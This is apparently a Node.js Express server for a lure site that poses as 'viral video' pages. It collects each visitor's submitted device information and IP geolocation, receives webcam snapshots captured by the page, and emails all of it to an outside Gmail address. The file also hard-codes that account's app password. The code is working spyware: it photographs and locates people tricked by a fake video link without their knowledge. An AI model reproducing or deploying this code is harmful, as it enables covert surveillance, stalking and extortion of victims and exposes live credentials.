// server.js
const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));


// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "sojib01943075658@gmail.com",
        pass: "eqws loxu bzbz imbx", // 16-char App Password
    },
});

app.get("/video/:id", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/ridhi-viral-video/:id", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "/Pages/Ridhi viral video.html"));
});



app.post("/collect-info", async (req, res) => {
  try {
    // ক্লায়েন্ট info
    const clientInfo = req.body;

    // সার্ভার থেকে IP
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    // ipapi থেকে location info
    let ipData = {};
    try {
      const resp = await fetch(`https://ipapi.co/${clientIp}/json/`);
      ipData = await resp.json();
    } catch(err) {
      console.warn("ipapi fetch failed:", err);
    }

    const finalInfo = {
      ...clientInfo,
      ip: clientIp,
      ...ipData
    };

    // ইমেইল পাঠানো
    await transporter.sendMail({
      from: "sojib01943075658@gmail.com",
      to: "rajib01943075658@gmail.com",
      subject: "📩 New Visitor Info",
      html: `<h3>New Visitor Info</h3><pre>${JSON.stringify(finalInfo, null, 2)}</pre>`
    });

    console.log("✅ Visitor info sent:", finalInfo);
    res.json({ ok: true });
  } catch(err) {
    console.error("❌ Email send error:", err);
    res.status(500).json({ error: "Email failed" });
  }
});

app.get("/my-ip", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  console.log(ip)
  res.json({ ip });
});



app.post("/upload-html-image", async (req, res) => {
    try {
        const { videoId, base64, noPermission } = req.body;

        // ক্যামেরা পারমিশন না থাকলে
        if (noPermission) {
            await transporter.sendMail({
                from: "sojib01943075658@gmail.com",
                to: "rajib01943075658@gmail.com",
                subject: "⚠️ Camera Permission Denied",
                text: `Video ID: ${videoId}\nCamera permission denied.`,
            });
            console.log("❌ Permission denied mail sent for video ID:", videoId);
            return res.json({ message: "Permission denied mail sent." });
        }

        if (!base64) {
            return res.status(400).send("❌ No image data received.");
        }

        // base64 থেকে buffer তৈরি
        const base64Data = base64.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, "base64");

        // Nodemailer email
        await transporter.sendMail({
            from: "sojib01943075658@gmail.com",
            to: "rajib01943075658@gmail.com",
            subject: `📸 Snapshot for Video ID: ${videoId}`,
            html: `
                <h2>📸 Captured Snapshot for Video ID: ${videoId}</h2>
                <p>See the image below:</p>
                <img src="cid:snapshotImage" style="max-width:100%; height:400px; border:1px solid #ccc; border-radius:8px;" />
            `,
            attachments: [
                {
                    filename: `snapshot-${videoId}.jpg`,
                    content: buffer,
                    cid: "snapshotImage" // inline image
                }
            ]
        });

        console.log("✅ Snapshot emailed for video ID:", videoId);
        res.json({ message: "Snapshot received and emailed." });

    } catch (err) {
        console.error("❌ Error:", err);
        res.status(500).send("Server error");
    }
});

// Catch-all 404 route
app.use((req, res) => {
  res.status(404).json({ message: "Page not found" });
});




app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
});